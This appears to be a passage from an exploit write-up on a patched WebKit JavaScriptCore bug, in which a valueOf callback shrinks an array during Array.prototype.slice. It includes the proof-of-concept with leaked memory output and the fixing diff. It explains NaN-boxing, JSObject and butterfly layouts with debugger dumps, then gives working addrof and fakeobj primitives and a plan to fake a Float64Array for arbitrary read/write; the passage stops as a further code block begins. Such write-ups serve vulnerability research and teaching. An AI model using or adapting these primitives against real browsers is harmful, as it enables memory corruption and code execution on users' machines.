</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">a</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mf">1.23</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">valueOf</span><span class="o">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span> <span class="o">=</span> <span class="p">[{},</span> <span class="mf">1.23</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The expected output should be an array with undefined values. But&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">spektre@skream:~/webkit$ ./WebKitBuild/Debug/bin/jsc poc.js
</span></span><span class="line"><span class="cl">1.23,2.23,1.5488838078e-314,6.365987374e-314,6.94548287109343e-310
</span></span></code></pre></td></tr></table>
</div>
</div><p>Here we abused the JS Type Conversions while calculating the &lsquo;begin&rsquo; and &rsquo;end&rsquo; variables during the fast path. During the conversion, valueOf method is executed, the length is set to 0, and the ArrayProtoSlice still uses the old length value which resulted in an Out-Of-Bounds read
We can also use this not only to leak values but also to inject values as well.</p>
<p>Now let us take a look at the commit(650552a) where this bug was patched.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/Source/JavaScriptCore/runtime/ArrayPrototype.cpp b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp
</span></span></span><span class="line"><span class="cl"><span class="gh">index cfdd7fceb7f47..08a6ec991afef 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/Source/JavaScriptCore/runtime/ArrayPrototype.cpp
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -863,7 +863,7 @@ EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>     if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception))
</span></span><span class="line"><span class="cl">         return JSValue::encode(jsUndefined());
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="gd">-    if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj))) {
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+    if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj) &amp;&amp; length == getLength(exec, thisObj))) {
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>         if (JSArray* result = asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin))
</span></span><span class="line"><span class="cl">             return JSValue::encode(result);
</span></span><span class="line"><span class="cl">     }
</span></span></code></pre></td></tr></table>
</div>
</div><p>Here the patch adds an additional check for the length of the source array before calling fastSlice.</p>
<p>Before we get into details of the exploit, Here are a few things you need to know that might help you understand the exploit better.</p>
<h3 id="nan-boxing-and-js-values">NaN Boxing and JS Values</h3>
<p>In JSC, The least significant values are used to indicate which type of value it is. This is clearly defined in JSValue.h</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">The</span> <span class="n">encoding</span> <span class="n">makes</span> <span class="n">use</span> <span class="n">of</span> <span class="n">unused</span> <span class="n">NaN</span> <span class="n">space</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">IEEE754</span> <span class="n">representation</span><span class="o">.</span>  <span class="n">Any</span> <span class="n">value</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">with</span> <span class="n">the</span> <span class="n">top</span> <span class="mi">13</span> <span class="n">bits</span> <span class="n">set</span> <span class="n">represents</span> <span class="n">a</span> <span class="n">QNaN</span> <span class="p">(</span><span class="n">with</span> <span class="n">the</span> <span class="nb">sign</span> <span class="n">bit</span> <span class="n">set</span><span class="p">)</span><span class="o">.</span>  <span class="n">QNaN</span> <span class="n">values</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">can</span> <span class="n">encode</span> <span class="n">a</span> <span class="mi">51</span><span class="o">-</span><span class="n">bit</span> <span class="n">payload</span><span class="o">.</span>  <span class="n">Hardware</span> <span class="n">produced</span> <span class="ow">and</span> <span class="n">C</span><span class="o">-</span><span class="n">library</span> <span class="n">payloads</span> <span class="n">typically</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">have</span> <span class="n">a</span> <span class="n">payload</span> <span class="n">of</span> <span class="n">zero</span><span class="o">.</span>  <span class="n">We</span> <span class="n">assume</span> <span class="n">that</span> <span class="n">non</span><span class="o">-</span><span class="n">zero</span> <span class="n">payloads</span> <span class="n">are</span> <span class="n">available</span> <span class="n">to</span> <span class="n">encode</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">pointer</span> <span class="ow">and</span> <span class="n">integer</span> <span class="n">values</span><span class="o">.</span>  <span class="n">Since</span> <span class="n">any</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">bit</span> <span class="n">pattern</span> <span class="n">where</span> <span class="n">the</span> <span class="n">top</span> <span class="mi">15</span> <span class="n">bits</span> <span class="n">are</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">all</span> <span class="n">set</span> <span class="n">represents</span> <span class="n">a</span> <span class="n">NaN</span> <span class="n">with</span> <span class="n">a</span> <span class="n">non</span><span class="o">-</span><span class="n">zero</span> <span class="n">payload</span><span class="p">,</span> <span class="n">we</span> <span class="n">can</span> <span class="n">use</span> <span class="n">this</span> <span class="n">space</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">NaN</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">ranges</span> <span class="n">to</span> <span class="n">encode</span> <span class="n">other</span> <span class="n">values</span> <span class="p">(</span><span class="n">however</span> <span class="n">there</span> <span class="n">are</span> <span class="n">also</span> <span class="n">other</span> <span class="n">ranges</span> <span class="n">of</span> <span class="n">NaN</span> <span class="n">space</span> <span class="n">that</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">could</span> <span class="n">have</span> <span class="n">been</span> <span class="n">selected</span><span class="p">)</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">This</span> <span class="nb">range</span> <span class="n">of</span> <span class="n">NaN</span> <span class="n">space</span> <span class="n">is</span> <span class="n">represented</span> <span class="n">by</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">numbers</span> <span class="n">beginning</span> <span class="n">with</span> <span class="n">the</span> <span class="mi">15</span><span class="o">-</span><span class="n">bit</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">hex</span> <span class="n">patterns</span> <span class="mh">0xFFFC</span> <span class="ow">and</span> <span class="mh">0xFFFE</span> <span class="o">-</span> <span class="n">we</span> <span class="n">rely</span> <span class="n">on</span> <span class="n">the</span> <span class="n">fact</span> <span class="n">that</span> <span class="n">no</span> <span class="n">valid</span> <span class="n">double</span><span class="o">-</span><span class="n">precision</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">numbers</span> <span class="n">will</span> <span class="n">fall</span> <span class="ow">in</span> <span class="n">these</span> <span class="n">ranges</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">The</span> <span class="n">top</span> <span class="mi">15</span><span class="o">-</span><span class="n">bits</span> <span class="n">denote</span> <span class="n">the</span> <span class="n">type</span> <span class="n">of</span> <span class="n">the</span> <span class="n">encoded</span> <span class="n">JSValue</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>     <span class="n">Pointer</span> <span class="p">{</span>  <span class="mi">0000</span><span class="p">:</span><span class="n">PPPP</span><span class="p">:</span><span class="n">PPPP</span><span class="p">:</span><span class="n">PPPP</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>              <span class="o">/</span> <span class="mi">0002</span><span class="p">:</span><span class="o">****</span><span class="p">:</span><span class="o">****</span><span class="p">:</span><span class="o">****</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>     <span class="n">Double</span>  <span class="p">{</span>         <span class="o">...</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>              \ <span class="n">FFFC</span><span class="p">:</span><span class="o">****</span><span class="p">:</span><span class="o">****</span><span class="p">:</span><span class="o">****</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>     <span class="n">Integer</span> <span class="p">{</span>  <span class="n">FFFE</span><span class="p">:</span><span class="mi">0000</span><span class="p">:</span><span class="n">IIII</span><span class="p">:</span><span class="n">IIII</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">The</span> <span class="n">scheme</span> <span class="n">we</span> <span class="n">have</span> <span class="n">implemented</span> <span class="n">encodes</span> <span class="n">double</span> <span class="n">precision</span> <span class="n">values</span> <span class="n">by</span> <span class="n">performing</span> <span class="n">a</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">integer</span> <span class="n">addition</span> <span class="n">of</span> <span class="n">the</span> <span class="n">value</span> <span class="mi">2</span><span class="o">^</span><span class="mi">49</span> <span class="n">to</span> <span class="n">the</span> <span class="n">number</span><span class="o">.</span> <span class="n">After</span> <span class="n">this</span> <span class="n">manipulation</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">no</span> <span class="n">encoded</span> <span class="n">double</span><span class="o">-</span><span class="n">precision</span> <span class="n">value</span> <span class="n">will</span> <span class="n">begin</span> <span class="n">with</span> <span class="n">the</span> <span class="n">pattern</span> <span class="mh">0x0000</span> <span class="ow">or</span> <span class="mh">0xFFFE</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">Values</span> <span class="n">must</span> <span class="n">be</span> <span class="n">decoded</span> <span class="n">by</span> <span class="n">reversing</span> <span class="n">this</span> <span class="n">operation</span> <span class="n">before</span> <span class="n">subsequent</span> <span class="n">floating</span> <span class="n">point</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">operations</span> <span class="n">may</span> <span class="n">be</span> <span class="n">peformed</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">signed</span> <span class="n">integers</span> <span class="n">are</span> <span class="n">marked</span> <span class="n">with</span> <span class="n">the</span> <span class="mi">16</span><span class="o">-</span><span class="n">bit</span> <span class="n">tag</span> <span class="mh">0xFFFE</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">The</span> <span class="n">tag</span> <span class="mh">0x0000</span> <span class="n">denotes</span> <span class="n">a</span> <span class="n">pointer</span><span class="p">,</span> <span class="ow">or</span> <span class="n">another</span> <span class="n">form</span> <span class="n">of</span> <span class="n">tagged</span> <span class="n">immediate</span><span class="o">.</span> <span class="n">Boolean</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span> <span class="n">null</span> <span class="ow">and</span> <span class="n">undefined</span> <span class="n">values</span> <span class="n">are</span> <span class="n">represented</span> <span class="n">by</span> <span class="n">specific</span><span class="p">,</span> <span class="n">invalid</span> <span class="n">pointer</span> <span class="n">values</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>     <span class="n">False</span><span class="p">:</span>     <span class="mh">0x06</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>     <span class="n">True</span><span class="p">:</span>      <span class="mh">0x07</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>     <span class="n">Undefined</span><span class="p">:</span> <span class="mh">0x0a</span>
</span></span><span class="line"><span class="cl">     <span class="o">*</span>     <span class="n">Null</span><span class="p">:</span>      <span class="mh">0x02</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Consider this example. We create an array with an Integer, a double, a string, a bool, and an object.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a = [0xdeadbeef,0.1337,&#34;abcd&#34;,true,{}]
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt;&gt;&gt; describe<span class="o">(</span>a<span class="o">)</span>
</span></span><span class="line"><span class="cl">Object: 0x7fffadfc4430 with butterfly 0x7fffaddd8288 <span class="o">(</span>0x7fffadff3360:<span class="o">[</span>Array, <span class="o">{}</span>, ArrayWithContiguous, Proto:0x7fffadfd0120<span class="o">])</span>, ID: <span class="m">87</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>and this is how the values look in memory</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/16gx 0x7fffaddd8288
</span></span><span class="line"><span class="cl">0x7fffaddd8288: 0x41ecd5b7dde00000      0x3fc21d14e3bcd35b
</span></span><span class="line"><span class="cl">0x7fffaddd8298: 0x00007fffa74ef940      0x0000000000000007
</span></span><span class="line"><span class="cl">0x7fffaddd82a8: 0x00007fffadffc360      0x00000000badbeef0
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="jsobject">JSObject</h3>
<p>An object in JS is a collection of Key-Value pairs, which are called properties.</p>
<p>consider this example.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">x</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="o">:</span><span class="mf">0.1337</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="o">:</span><span class="s2">&#34;lol&#34;</span><span class="p">,</span><span class="s1">&#39;d&#39;</span><span class="o">:</span><span class="kc">true</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="o">:</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">]}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>we can use describe() to get info about the object.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt;&gt;&gt; describe<span class="o">(</span>x<span class="o">)</span>
</span></span><span class="line"><span class="cl">Object: 0x7fffadffc1a0 with butterfly <span class="o">(</span>nil<span class="o">)</span> <span class="o">(</span>0x7fffadf9ea30:<span class="o">[</span>Object, <span class="o">{</span>a:0, b:1, c:2, d:3, e:4<span class="o">}</span>, NonArray, Proto:0x7fffadfc40a0, Leaf<span class="o">])</span>, ID: <span class="m">280</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is how the object looks in memory.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/16gx 0x7fffadffc1a0
</span></span><span class="line"><span class="cl">0x7fffadffc1a0: 0x0100180000000118      0x0000000000000000
</span></span><span class="line"><span class="cl">0x7fffadffc1b0: 0xffff000000000001      0x3fc21d14e3bcd35b
</span></span><span class="line"><span class="cl">0x7fffadffc1c0: 0x00007fffadf94300      0x0000000000000007
</span></span><span class="line"><span class="cl">0x7fffadffc1d0: 0x00007fffadfc4320      0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Structure of a JSObject:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">--------------------
</span></span><span class="line"><span class="cl">    StructureID        32 bits
</span></span><span class="line"><span class="cl">--------------------   
</span></span><span class="line"><span class="cl">    Header Bits        32 bits
</span></span><span class="line"><span class="cl">--------------------
</span></span><span class="line"><span class="cl">    Butterfly          64 bits
</span></span><span class="line"><span class="cl">--------------------
</span></span><span class="line"><span class="cl">    Inline Properties  n*64 bits
</span></span><span class="line"><span class="cl">--------------------
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="butterfly">Butterfly</h3>
<p>Butterfly consists of elements of the array and out-of-line properties. It&rsquo;s called a butterfly because this points to the middle of the structure.
The elements are at +ve offsets from the Butterfly pointer and out-of-line properties are at -ve offsets.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt;&gt;&gt; <span class="nv">a</span> <span class="o">=</span> <span class="o">[</span>0xdeadbeef,0.1337,<span class="s2">&#34;abcd&#34;</span>,true,<span class="o">{}]</span>
</span></span><span class="line"><span class="cl">3735928559,0.1337,abcd,true,<span class="o">[</span>object Object<span class="o">]</span>
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; describe<span class="o">(</span>a<span class="o">)</span>
</span></span><span class="line"><span class="cl">Object: 0x7fffadfc4340 with butterfly 0x7fffadde4108 <span class="o">(</span>0x7fffadff3360:<span class="o">[</span>Array, <span class="o">{}</span>, ArrayWithContiguous, Proto:0x7fffadfd0120<span class="o">])</span>, ID: <span class="m">87</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Here is how a butterfly is represented in memory:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/16gx 0x7fffadde4108
</span></span><span class="line"><span class="cl">0x7fffadde4108: 0x41ecd5b7dde00000      0x3fc21d14e3bcd35b
</span></span><span class="line"><span class="cl">0x7fffadde4118: 0x00007fffadf94360      0x0000000000000007
</span></span><span class="line"><span class="cl">0x7fffadde4128: 0x00007fffadffc1e0      0x00000000badbeef0
</span></span><span class="line"><span class="cl">0x7fffadde4138: 0x00000000badbeef0      0x00000000badbeef0
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="exploit-strategy">Exploit Strategy</h2>
<ul>
<li>
<p>First, we start with writing our exploit primitives addrof and fakeobj.</p>
</li>
<li>
<p>For addrof, We make use of an array of doubles, which will have its indexing type as ArrayWithDoubles. and use the valueof function to shrink the array, allocate an array with the object, and return a size larger than the array size which will access the object. slice preserves the indexing type, and the data we access is treated as native doubles which gives us JSValue leak which is in the form of 64bit Floating point value. fakeobj follows a similar approach but the other way around.</p>
</li>
<li>
<p>addrof primitive</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">object</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">a</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mf">0.123</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">valueOf</span><span class="o">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">a</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nx">b</span> <span class="o">=</span> <span class="p">[</span><span class="nx">object</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">Int64</span><span class="p">.</span><span class="nx">fromDouble</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>fakeobj primitive</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">a</span><span class="p">.</span><span class="nx">push</span><span class="p">({});</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">valueOf</span><span class="o">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">a</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">b</span> <span class="o">=</span> <span class="p">[</span><span class="nx">addr</span><span class="p">.</span><span class="nx">asDouble</span><span class="p">()];</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">b</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="sb">```
</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Now we will aim to achieve arb read/write, we achieve this using a fake Float64Array Instance.</li>
</ul>
<p>Why Float64Array?
Typed Arrays store raw binary data, we can get arbitrary read/write if we control the data pointer.</p>
<p>Ok, Before we proceed further, To fake an object, We need a valid JSCell header and JS StructureID which is not static. In this case, We can predict a valid structure id by spraying a lot of objects and adding a different property each time which gives us a unique structure id.</p>
<ul>
<li>We now spray a lot of Float64Array instances and guess the structure id. we can check if the guess is correct using <code>instanceof</code>.</li>
<li>After setting up the cell header of fake Float64Array, We make the vector ptr ( pointer to the backing memory ) of the fake object point to another array, which gives us arb read/write.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
